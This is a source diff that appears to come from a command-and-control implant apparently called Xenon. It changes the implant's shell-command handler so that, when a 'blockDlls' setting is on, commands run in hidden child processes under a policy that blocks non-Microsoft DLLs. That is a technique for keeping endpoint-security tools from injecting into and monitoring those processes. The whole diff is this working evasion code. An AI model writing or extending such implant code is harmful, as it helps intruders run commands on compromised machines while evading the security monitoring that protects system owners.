@@ -6,6 +6,24 @@
 #include "Task.h"
 #include "Config.h"
 #include "Identity.h"
+#include "Xenon.h"
+
+#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
+#endif
+
+#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON ((DWORD64)1ULL << 44)
+#endif
+
+/* MinGW-w64 headers may not define STARTUPINFOEXA — define it manually */
+#ifndef _STARTUPINFOEXA_DEFINED
+#define _STARTUPINFOEXA_DEFINED
+typedef struct _STARTUPINFOEXA {
+    STARTUPINFOA                 StartupInfo;
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
+#endif
 
 #ifdef INCLUDE_CMD_SHELL
 
@@ -109,17 +127,58 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     }
     else
     {
-        processCreated = CreateProcessA(
-            NULL,             // Application name
-            cmdLine,          // Command line
-            NULL,             // Process security attributes
-            NULL,             // Thread security attributes
-            TRUE,             // Inherit handles
-            CREATE_NO_WINDOW, // Creation flags
-            NULL,             // Environment
-            NULL,             // Current directory
-            &si,              // Startup info
-            &pi);             // Process information
+        if ( xenonConfig->blockDlls )
+        {
+            STARTUPINFOEXA         siex     = { 0 };
+            SIZE_T                 attrSize = 0;
+
+            siex.StartupInfo            = si;
+            siex.StartupInfo.cb         = sizeof(STARTUPINFOEXA);
+
+            /* Build the extended attribute list with block-non-MS-DLL policy */
+            InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
+            if ( siex.lpAttributeList )
+            {
+                InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize);
+                DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+                UpdateProcThreadAttribute(siex.lpAttributeList, 0,
+                    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                    &policy, sizeof(policy), NULL, NULL);
+            }
+
+            processCreated = CreateProcessA(
+                NULL,
+                cmdLine,
+                NULL,
+                NULL,
+                TRUE,
+                EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+                NULL,
+                NULL,
+                (LPSTARTUPINFOA)&siex,
+                &pi);
+
+            if ( siex.lpAttributeList )
+            {
+                DeleteProcThreadAttributeList(siex.lpAttributeList);
+                HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
+            }
+        }
+        else
+        {
+            processCreated = CreateProcessA(
+                NULL,             // Application name
+                cmdLine,          // Command line
+                NULL,             // Process security attributes
+                NULL,             // Thread security attributes
+                TRUE,             // Inherit handles
+                CREATE_NO_WINDOW, // Creation flags
+                NULL,             // Environment
+                NULL,             // Current directory
+                &si,              // Startup info
+                &pi);             // Process information
+        }
     }
 
     if ( !processCreated )
